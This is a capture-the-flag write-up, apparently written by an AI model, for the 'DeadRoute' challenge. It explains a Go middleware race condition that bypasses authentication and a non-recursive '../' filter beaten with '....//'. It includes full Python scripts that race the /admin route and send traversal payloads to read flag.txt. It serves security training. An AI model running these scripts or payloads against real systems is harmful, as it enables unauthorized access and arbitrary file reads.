Here is the formatted writeup for the **DeadRoute** challenge.

---

# DeadRoute

> **Description:** Welcome to the Tinselwick Sticky Notes board! Unfortunately, the Town Clerk implemented a new routing system that has locked everyone out of the admin panel. The Grinch’s 'paywall of spells' logic is spreading, preventing the town's wishes from coming true. We need you to bypass the blocked routes, retrieve the emergency override code, and stop the corrupted festive code.

## Vulnerability Analysis

We are provided with the source code for a Go binary. A review reveals two critical vulnerabilities:

### 1. Race Condition in Middleware (Auth Bypass)

The custom router implementation (`models/router.go`) contains a race condition in how it handles middleware slices.

* **The Flaw:** In Go, a slice is a header containing a pointer to an underlying array, a length, and a capacity. In the route handler, the code copies the slice header (`mws := r.mws`) but shares the underlying array.
* **The Race:** When `append` is called inside the closure, it writes to this shared underlying array. If multiple requests happen simultaneously (e.g., a public route vs. a private route), one request can overwrite the middleware of the other.
* **The Exploit:** By flooding a public route (like `/login`), we can "pollute" the shared array. Simultaneously requesting `/admin` gives us a chance to execute the request *after* the `RequireAuth` middleware has been overwritten by a non-blocking handler from the public route.

### 2. File Path Traversal

The application attempts to sanitize file paths using a weak filter:

```go
noteID = strings.ReplaceAll(noteID, "../", "")

```

* **The Flaw:** `strings.ReplaceAll` is not recursive; it only removes the substring once.
* **The Bypass:** An attacker can construct a payload like `....//`.
1. The filter finds the inner `../` (indexes 2-4) and removes it.
2. The remaining characters collapse to form `../`.


* **Impact:** This allows reading arbitrary files on the system (e.g., `flag.txt`) via the `ReadNote` function.

---

## Exploitation

### Step 1: Bypassing Authentication

We use a threaded Python script to trigger the race condition. "Polluter" threads hit `/login` to trigger the unsafe `append` and modify the shared memory, while "Checker" threads spam `/admin` attempting to access the dashboard without authentication.

**Exploit Script (`race_bypass.py`):**

```python
import requests
import threading
import sys

# TARGET IP from your challenge
TARGET = "http://154.57.164.76:32079"

# Shared flag to stop threads once we win
stop_threads = False

def pollution_worker(sess):
    """
    Sends requests to a public endpoint (/login).
    This tries to overwrite the shared middleware slot with a standard handler
    that DOES NOT block execution (unlike RequireAuth).
    """
    global stop_threads
    while not stop_threads:
        try:
            # We use /login because it's a valid public route
            sess.get(f"{TARGET}/login")
        except:
            pass

def admin_worker(sess):
    """
    Spams the admin endpoint.
    If the race succeeds, RequireAuth is replaced by LoginHandler.
    The server will return 200 OK and likely the Dashboard content mixed with Login content.
    """
    global stop_threads
    while not stop_threads:
        try:
            resp = sess.get(f"{TARGET}/admin")
            
            # If we bypassed auth, we won't get redirected to /login
            if "Dashboard" in resp.text or "Welcome" in resp.text:
                print(f"\n[+] BOOM! Auth Bypassed!")
                print(f"[+] Response length: {len(resp.text)}")
                print("-" * 30)
                # Dump a snippet of the body to see the flag/token
                print(resp.text[:500]) 
                print("-" * 30)
                stop_threads = True
                return
            elif resp.status_code == 200 and "Login" not in resp.text:
                # Catch-all for success
                print(f"\n[+] Possible hit! Status 200")
                print(resp.text)
                stop_threads = True
        except:
            pass

def main():
    print(f"[*] Starting Race Condition exploit against {TARGET}")
    print("[*] Spawning threads... (Ctrl+C to stop manually)")

    # Use a session for connection pooling (faster requests)
    sess = requests.Session()
    
    threads = []
    
    # Spawn "Polluters" (create the noise)
    for _ in range(10):
        t = threading.Thread(target=pollution_worker, args=(sess,))
        t.daemon = True
        t.start()
        threads.append(t)

    # Spawn "Checkers" (try to enter admin)
    for _ in range(10):
        t = threading.Thread(target=admin_worker, args=(sess,))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while not stop_threads:
            pass
    except KeyboardInterrupt:
        print("\n[*] Stopping...")

if __name__ == "__main__":
    main()

```

Running this script grants us access to the dashboard, where we can retrieve the admin session cookie (or token) required for the next step.

### Step 2: Reading the Flag

With the admin cookie (mocked here as `santa_auth`), we target the `/admin/notes/read` endpoint. We inject the `....//` payload into the `id` parameter to traverse the directory structure and read `flag.txt`.

**Exploit Script (`get_flag.py`):**

```python
import requests
import sys
import json

# Usage: python3 get_flag.py <COOKIE_VALUE>
if len(sys.argv) < 2:
    print("Usage: python3 get_flag.py <COOKIE_VALUE>")
    sys.exit(1)

# Configuration
COOKIE_VALUE = sys.argv[1]
TARGET_IP = "http://154.57.164.76:32079"
URL = f"{TARGET_IP}/admin/notes/read"

print(f"[*] Attacking with cookie: {COOKIE_VALUE[:10]}...")

# 1. Setup Session
session = requests.Session()
session.cookies.set("santa_auth", COOKIE_VALUE)

# 2. Define Payloads
# The base directory is 'notes/', so we need to go up to find the flag.
# We use the filter bypass: "....//" -> "../"
payloads = [
    "....//flag.txt",               # Flag in app root
    "....//flag",                   # Flag in app root (no extension)
    "....//....//flag.txt",         # Flag in parent
    "....//....//....//flag.txt",   # Flag in system root
]

# 3. Hunt for the flag
for payload in payloads:
    print(f"[*] Trying payload: {payload}")
    try:
        # The 'id' parameter is where the traversal happens
        resp = session.get(URL, params={"id": payload})

        if resp.status_code == 200:
            try:
                data = resp.json()
                # The code treats the first line of the file as the "Title"
                content = data.get('title', '') + "\n" + data.get('content', '')

                if "HTB" in content or "flag" in content.lower():
                    print("\n" + "!" * 40)
                    print(f"[+] FLAG FOUND at {payload}!")
                    print("!" * 40)
                    print(content.strip())
                    print("!" * 40)
                    sys.exit(0)
                else:
                    print(f"[+] File found, but no flag. Content: {content[:50]}...")
            except:
                print(f"[+] Raw response (not JSON): {resp.text[:100]}")
        elif resp.status_code == 404:
            print("[-] File not found")
        elif resp.status_code == 403:
            print("[-] Auth failed (Cookie invalid?)")
            sys.exit(1)

    except Exception as e:
        print(f"[-] Error: {e}")

```

Executing this script retrieves the flag content from the server.

---

**Would you like me to diagram the specific memory state of the slice header before and after the race condition occurs?**